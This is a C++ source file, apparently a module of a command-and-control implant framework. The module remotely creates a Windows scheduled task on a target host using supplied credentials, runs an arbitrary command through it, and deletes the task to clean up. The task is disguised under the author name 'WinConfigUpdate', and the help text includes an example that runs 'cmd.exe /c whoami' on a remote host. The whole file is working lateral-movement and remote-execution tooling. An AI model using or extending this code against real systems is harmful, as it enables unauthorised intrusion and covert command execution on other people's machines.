#include "TaskScheduler.hpp"

#include "Common.hpp"

#include <sstream>
#include <iomanip>
#include <random>

#ifdef _WIN32
#include <windows.h>
#include <atlbase.h>
#include <comdef.h>
#include <taskschd.h>
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsuppw.lib")
using ATL::CComPtr;
#endif

using namespace std;

constexpr std::string_view moduleNameTaskScheduler = "taskScheduler";
constexpr unsigned long long moduleHashTaskScheduler = djb2(moduleNameTaskScheduler);

#ifdef _WIN32
extern "C" __declspec(dllexport) TaskScheduler* TaskSchedulerConstructor()
{
    return new TaskScheduler();
}
#else
extern "C" __attribute__((visibility("default"))) TaskScheduler* TaskSchedulerConstructor()
{
    return new TaskScheduler();
}
#endif

TaskScheduler::TaskScheduler()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleNameTaskScheduler), moduleHashTaskScheduler)
#else
    : ModuleCmd("", moduleHashTaskScheduler)
#endif
{
}

TaskScheduler::~TaskScheduler() = default;

std::string TaskScheduler::getInfo()
{
    std::ostringstream oss;
#ifdef BUILD_TEAMSERVER
    oss << "Task Scheduler Module:\n";
    oss << "Create a scheduled task on a remote or local Windows host." << '\n';
    oss << "The task is executed immediately after registration then deleted." << '\n';
    oss << "Options:" << '\n';
    oss << "  -s <server>           Target host (omit for localhost)." << '\n';
    oss << "  -t <taskName>         Name of the scheduled task. Defaults to a random name." << '\n';
    oss << "  -c <command>          Executable to run." << '\n';
    oss << "  -a <arguments>        Command line arguments." << '\n';
    oss << "  -u <user>             Optional DOMAIN\\user for registration." << '\n';
    oss << "  -p <password>         Password for the provided user." << '\n';
    oss << "  --no-run              Register the task without running it." << '\n';
    oss << "  --nocleanup           Don't delete the task after it has been started." << '\n';
    oss << "Example:" << '\n';
    oss << "  taskScheduler -s HOST -t UpdateTask -c C:\\Windows\\System32\\cmd.exe -a \"/c whoami\"" << '\n';
#endif
    return oss.str();
}

std::string TaskScheduler::packParameters(const Parameters& params) const
{
    std::string packed;
    auto append = [&packed](const std::string& value)
    {
        packed.append(value);
        packed.push_back('\0');
    };

    append(params.server);
    append(params.taskName);
    append(params.command);
    append(params.arguments);
    append(params.username);
    append(params.password);
    append(params.skipRun ? "1" : "0");
    append(params.deleteAfterRun ? "1" : "0");
    return packed;
}

TaskScheduler::Parameters TaskScheduler::unpackParameters(const std::string& data) const
{
    Parameters params;
    std::vector<std::string> parts;
    size_t start = 0;
    while (start < data.size())
    {
        size_t end = data.find('\0', start);
        if (end == std::string::npos)
        {
            break;
        }
        parts.emplace_back(data.substr(start, end - start));
        start = end + 1;
    }

    if (parts.size() < 8)
    {
        return params;
    }

    params.server = parts[0];
    params.taskName = parts[1];
    params.command = parts[2];
    params.arguments = parts[3];
    params.username = parts[4];
    params.password = parts[5];
    params.skipRun = parts[6] == "1";
    params.deleteAfterRun = parts[7] == "1";
    return params;
}

int TaskScheduler::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) || defined(C2CORE_BUILD_TESTS)
    std::vector<std::string> args = regroupStrings(splitedCmd);
    Parameters params;

    if (args.size() < 2)
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    auto randomName = []()
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<int> dist(1000, 9999);
        std::ostringstream oss;
        oss << "Task_" << dist(gen);
        return oss.str();
    };

    params.taskName = randomName();
    params.deleteAfterRun = true;

    for (size_t i = 1; i < args.size(); ++i)
    {
        const std::string& current = args[i];
        if (current == "-s" && i + 1 < args.size())
        {
            params.server = args[++i];
        }
        else if (current == "-t" && i + 1 < args.size())
        {
            params.taskName = args[++i];
        }
        else if (current == "-c" && i + 1 < args.size())
        {
            params.command = args[++i];
        }
        else if (current == "-a" && i + 1 < args.size())
        {
            params.arguments = args[++i];
            std::cout << "params.arguments " << params.arguments << std::endl;
        }
        else if (current == "-u" && i + 1 < args.size())
        {
            params.username = args[++i];
        }
        else if (current == "-p" && i + 1 < args.size())
        {
            params.password = args[++i];
        }
        else if (current == "--no-run")
        {
            params.skipRun = true;
        }
        else if (current == "--nocleanup")
        {
            params.deleteAfterRun = false;
        }
        else if (!current.empty() && current[0] != '-')
        {
            // treat positional command if not provided via -c
            if (params.command.empty())
            {
                params.command = current;
            }
            else if (params.arguments.empty())
            {
                params.arguments = current;
            }
        }
    }

    if (params.command.empty())
    {
        c2Message.set_returnvalue("Missing command to execute.\n" + getInfo());
        return -1;
    }

    c2Message.set_instruction(splitedCmd[0]);
    c2Message.set_cmd(packParameters(params));
#endif
    return 0;
}

int TaskScheduler::process(C2Message& c2Message, C2Message& c2RetMessage)
{
    std::string cmd = c2Message.cmd();
    c2RetMessage.set_instruction(c2RetMessage.instruction()); 
    c2RetMessage.set_cmd(cmd); 
    
    Parameters params = unpackParameters(c2Message.cmd());

    int error=0;
    std::string result;

#ifdef _WIN32
    error = executeTask(params, result);
#else
    result = "Only supported on Windows.\n";
#endif
    
    if(error)
        c2RetMessage.set_errorCode(error);

    c2RetMessage.set_instruction(c2Message.instruction());
    c2RetMessage.set_cmd(c2Message.cmd());
    c2RetMessage.set_returnvalue(result);

    return 0;
}


#define ERROR_CO_INIT 1 
#define ERROR_CO_INIT_SEC 2
#define ERROR_CO_CREATE_INST 3
#define ERROR_TS_CONNECT 4
#define ERROR_TS_GET_FOLDER 5
#define ERROR_TS_NEW_TASK 6
#define ERROR_TD_ACTION 7
#define ERROR_ACTION_CREATE 8
#define ERROR_ACTION_QUERY_INTERFACE 9
#define ERROR_ACTION_PUT_PATH 10
#define ERROR_ACTION_PUT_ARG 11
#define ERROR_REGISTER_TASK 12
#define ERROR_REGISTER_TASK_START 13
#define ERROR_REGISTER_TASK_DEL 14


int TaskScheduler::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) || defined(C2CORE_BUILD_TESTS)
    int errorCode = c2RetMessage.errorCode();
    if(errorCode>0)
    {
        errorMsg = c2RetMessage.returnvalue();
    }
#endif
    return 0;
}

#ifdef _WIN32
namespace
{
    std::wstring toWide(const std::string& input)
    {
        if (input.empty())
        {
            return std::wstring();
        }
        int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, input.c_str(), static_cast<int>(input.size()), nullptr, 0);
        std::wstring wide(sizeNeeded, L'\0');
        MultiByteToWideChar(CP_UTF8, 0, input.c_str(), static_cast<int>(input.size()), wide.data(), sizeNeeded);
        return wide;
    }

    std::string formatHResult(HRESULT hr)
    {
        _com_error err(hr);
        std::ostringstream oss;
        oss << "0x" << std::hex << std::uppercase << hr << ": " << err.ErrorMessage();
        return oss.str();
    }
}


int TaskScheduler::executeTask(const Parameters& params, std::string& result) const
{    
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr))
    {
    }
    else if (hr != RPC_E_CHANGED_MODE)
    {
        result = formatHResult(hr);
        return ERROR_CO_INIT;
    }

    CComPtr<ITaskService> taskService;
    CComPtr<ITaskFolder> rootFolder;
    CComPtr<ITaskDefinition> taskDefinition;
    CComPtr<IRegistrationInfo> regInfo;
    CComPtr<IPrincipal> principal;
    CComPtr<ITaskSettings> settings;
    CComPtr<IActionCollection> actionCollection;
    CComPtr<IAction> action;
    CComPtr<IExecAction> execAction;
    CComPtr<IRegisteredTask> registeredTask;
    CComPtr<IRunningTask> runningTask;

    auto releaseAll = [&]() {
        runningTask.Release();
        execAction.Release();
        action.Release();
        actionCollection.Release();
        settings.Release();
        principal.Release();
        regInfo.Release();
        registeredTask.Release();
        taskDefinition.Release();
        rootFolder.Release();
        taskService.Release();
    };

    hr = CoInitializeSecurity(nullptr, -1, nullptr, nullptr,
                            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                            RPC_C_IMP_LEVEL_IMPERSONATE,
                            nullptr, 0, nullptr);
    if (FAILED(hr) && hr != RPC_E_TOO_LATE)
    {
        releaseAll();
        CoUninitialize();
        
        result = formatHResult(hr);
        return ERROR_CO_INIT_SEC;
    }

    hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&taskService)); 
    if (FAILED(hr))
    {
        releaseAll();
        CoUninitialize();
        
        result = formatHResult(hr);
        return ERROR_CO_CREATE_INST;
    }

    _variant_t serverVariant;
    if (!params.server.empty())
        serverVariant = _variant_t(toWide(params.server).c_str());
    _variant_t userVariant;
    if (!params.username.empty())
        userVariant = _variant_t(toWide(params.username).c_str());
    _variant_t passwordVariant;
    if (!params.password.empty())
        passwordVariant = _variant_t(toWide(params.password).c_str());

    hr = taskService->Connect(serverVariant, userVariant, passwordVariant, _variant_t());
    if (FAILED(hr))
    {
        releaseAll();
        CoUninitialize();

        result = formatHResult(hr);
        return ERROR_TS_CONNECT;
    }

    hr = taskService->GetFolder(_bstr_t(L"\\"), &rootFolder);
    if (FAILED(hr))
    {
        releaseAll();
        CoUninitialize();

        result = formatHResult(hr);
        return ERROR_TS_GET_FOLDER;
    }

    hr = taskService->NewTask(0, &taskDefinition);
    if (FAILED(hr))
    {
        releaseAll();
        CoUninitialize();

        result = formatHResult(hr);
        return ERROR_TS_NEW_TASK;
    }

    if (SUCCEEDED(taskDefinition->get_RegistrationInfo(&regInfo)))
    {
        regInfo->put_Author(_bstr_t(L"WinConfigUpdate"));
        regInfo->put_Description(_bstr_t(L"Task created by WinConfigUpdate."));
    }

    if (SUCCEEDED(taskDefinition->get_Principal(&principal)))
    {
        if (!params.username.empty())
        {
            principal->put_UserId(_bstr_t(toWide(params.username).c_str()));
            principal->put_LogonType(TASK_LOGON_PASSWORD);
        }
        else
        {
            principal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
        }
    }

    if (SUCCEEDED(taskDefinition->get_Settings(&settings)))
    {
        settings->put_StartWhenAvailable(VARIANT_TRUE);
        settings->put_ExecutionTimeLimit(_bstr_t(L"PT0S"));
        settings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
        settings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
    }

    hr = taskDefinition->get_Actions(&actionCollection);
    if (FAILED(hr))
    {
        releaseAll();
        CoUninitialize();

        result = formatHResult(hr);
        return ERROR_TD_ACTION;
    }

    hr = actionCollection->Create(TASK_ACTION_EXEC, &action);
    if (FAILED(hr))
    {
        releaseAll();
        CoUninitialize();

        result = formatHResult(hr);
        return ERROR_ACTION_CREATE;
    }

    hr = action->QueryInterface(IID_PPV_ARGS(&execAction));
    if (FAILED(hr))
    {
        releaseAll();
        CoUninitialize();

        result = formatHResult(hr);
        return ERROR_ACTION_QUERY_INTERFACE;
    }

    hr = execAction->put_Path(_bstr_t(toWide(params.command).c_str()));
    if (FAILED(hr))
    {
        releaseAll();
        CoUninitialize();

        result = formatHResult(hr);
        return ERROR_ACTION_PUT_PATH;
    }

    if (!params.arguments.empty())
    {
        hr = execAction->put_Arguments(_bstr_t(toWide(params.arguments).c_str()));
        if (FAILED(hr))
        {
            releaseAll();
            CoUninitialize();

            result = formatHResult(hr);
            return ERROR_ACTION_PUT_ARG;
        }
    }

    TASK_LOGON_TYPE logonType = params.username.empty() ? TASK_LOGON_INTERACTIVE_TOKEN : TASK_LOGON_PASSWORD;
    hr = rootFolder->RegisterTaskDefinition(_bstr_t(toWide(params.taskName).c_str()), taskDefinition,
                                            TASK_CREATE_OR_UPDATE,
                                            params.username.empty() ? _variant_t() : _variant_t(toWide(params.username).c_str()),
                                            params.password.empty() ? _variant_t() : _variant_t(toWide(params.password).c_str()),
                                            logonType,
                                            _variant_t(L""),
                                            &registeredTask);
    if (FAILED(hr))
    {
        releaseAll();
        CoUninitialize();
        
        result = formatHResult(hr);
        return ERROR_REGISTER_TASK;
    }

    std::ostringstream oss;
    oss << "" << params.taskName << " registered." << '\n';

    if (!params.skipRun)
    {
        VARIANT empty = {};
        VariantInit(&empty);
        hr = registeredTask->Run(empty, &runningTask);
        if (FAILED(hr))
        {
            VariantClear(&empty);
            releaseAll();
            CoUninitialize();

            result = formatHResult(hr);
            return ERROR_REGISTER_TASK_START;
        }
        else
        {
            oss << "Started" << '\n';
        }
        VariantClear(&empty);
    }

    if (params.deleteAfterRun)
    {
        HRESULT delHr = rootFolder->DeleteTask(_bstr_t(toWide(params.taskName).c_str()), 0);
        if (FAILED(delHr))
        {
            releaseAll();
            CoUninitialize();

            result = formatHResult(hr);
            return ERROR_REGISTER_TASK_DEL;
        }
        else
        {
            oss << "Deleted" << '\n';
        }
    }

    result = oss.str();

    releaseAll();
    CoUninitialize();
    
    return 0;
}
#endif
